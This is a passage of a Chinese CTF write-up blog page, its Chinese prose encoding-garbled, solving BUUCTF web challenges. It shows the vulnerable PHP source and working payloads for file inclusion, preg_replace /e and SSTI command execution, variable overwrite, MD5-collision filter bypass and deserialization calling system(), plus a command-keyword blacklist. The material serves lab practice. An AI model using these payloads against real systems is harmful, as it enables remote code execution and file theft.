class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;user_password.php&#x27;</span>,</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><p>é¢˜ç›®ç»™äº†æºç </p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(isset($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    echo <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        die(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    include($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ„é€ åŒ…ï¼ˆtext=data://text/plain,I%20have%20a%20dreamï¼‰</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /?text=php:<span class="comment">//input&amp;file=php://filter/convert.base64-encode/resource=next.php HTTP/1.1</span></span><br><span class="line">Host: 0722e0f3-821d-4d78-9dc7-be292c48d6fb.node3.buuoj.cn</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">91.0</span><span class="number">.4472</span><span class="number">.114</span> Safari/<span class="number">537.36</span></span><br><span class="line"><span class="attr">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 14</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">I have a dream</span></span><br></pre></td></tr></table></figure><p>å°†æ‹¿åˆ°çš„ç»“æœbase64 decode</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_GET <span class="keyword">as</span> $re =&gt; $str</span>)</span> &#123;</span><br><span class="line">    echo complex($re, $str). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="built_in">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒ<a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">https://blog.csdn.net/weixin_43749601/article/details/113417093</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*=$&#123;system($_GET[x])&#125;&amp;x=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>flagå¤„å›æ˜¾ipåœ°å€çš„åœ°æ–¹SSTIæ¨¡æ¿æ³¨å…¥</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>dirsearchæ‰«æåˆ°.gitï¼Œä¸‹è½½æºç </p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">$is = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">$handsome = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_POST <span class="keyword">as</span> $x =&gt; $y</span>)</span>&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_GET <span class="keyword">as</span> $x =&gt; $y</span>)</span>&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">foreach</span>(<span class="params">$_GET <span class="keyword">as</span> $x =&gt; $y</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!isset($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset($_POST[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;the flag is: &quot;</span>.$flag;</span><br></pre></td></tr></table></figure><p>$$å˜é‡è¦†ç›–é—®é¢˜ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨exitè¾“å‡ºï¼Œçœ‹GETéƒ¨åˆ†çš„éå†ï¼Œå‡å¦‚ä¼ è¿›çš„æ•°æ®ä¸º<code>yds=flag</code>ï¼Œé‚£ä¹ˆå°±å˜ä¸ºäº†<code>$yds=flag</code>ï¼Œå†é€šè¿‡<code>exit($yds)</code>è¾“å‡ºå³å¯ã€‚</p><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>åˆ†æé“¾æ¥ï¼Œä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­imgçš„å€¼ä¸¤æ¬¡base64çš„å€¼ï¼Œè§‚å¯Ÿå‘ç°æ˜¯è½¬çš„ascii(ä¸»è¦æ˜¯çœ‹åˆ°äº†2e)ï¼Œè¿™é‡Œåº”è¯¥æœ‰æ–‡ä»¶åŒ…å«ï¼Œè½¬ä¸ºçœ‹index.php(TmprMlpUWTBOalUzT0RKbE56QTJPRGN3)ï¼Œå¾—åˆ°æºç </p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!isset($_GET[<span class="string">&#x27;img&#x27;</span>]) || !isset($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    echo <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    die(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;</span><br><span class="line">    echo(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    echo <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (string)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        echo <span class="string">`$cmd`</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span></span><br><span class="line"><span class="css"><span class="xml">  <span class="selector-tag">body</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml">   <span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">./bj.png</span>)  no-repeat center center;</span></span></span><br><span class="line"><span class="css"><span class="xml">   <span class="attribute">background-size</span>:cover;</span></span></span><br><span class="line"><span class="css"><span class="xml">   <span class="attribute">background-attachment</span>:fixed;</span></span></span><br><span class="line"><span class="css"><span class="xml">   <span class="attribute">background-color</span>:<span class="number">#CCCCCC</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>md5ç›¸å…³å‚è€ƒ</p><p><a href="https://blog.csdn.net/vhkjhwbs/article/details/97618629">https://blog.csdn.net/vhkjhwbs/article/details/97618629</a></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?cmd=c\at%<span class="number">20</span>/flag HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="attr">Host</span>: f8ed05f8-<span class="number">2e32</span>-<span class="number">4176</span>-9f24-8c89e45aa403.node4.buuoj.cn</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">91.0</span><span class="number">.4472</span><span class="number">.114</span> Safari/<span class="number">537.36</span></span><br><span class="line"><span class="attr">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 389</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span></span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç”¨sortè¯»æ–‡ä»¶</p><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h2><p>æ ¹æ®åŒ…ç‰¹ç‚¹æ„é€ <code>func=file_get_contents&amp;p=index.php</code></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($this-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            die(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><p>æ„é€ ååºåˆ—åŒ–</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Test();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><p>æ‰¾flagçš„payload</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O%3a4%3a<span class="string">&quot;Test&quot;</span>%3a2%3a&#123;s%3a1%3a<span class="string">&quot;p&quot;</span>%3bs%3a18%3a<span class="string">&quot;find+/+-name+flag*&quot;</span>%3bs%3a4%3a<span class="string">&quot;func&quot;</span>%3bs%3a6%3a<span class="string">&quot;system&quot;</span>%3b&#125;</span><br></pre></td></tr></table></figure><p>è¯»flag</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=highlight_file&amp;p=<span class="regexp">/tmp/</span>flagoefiu4r93</span><br></pre></td></tr></table></figure><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>XXE</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span 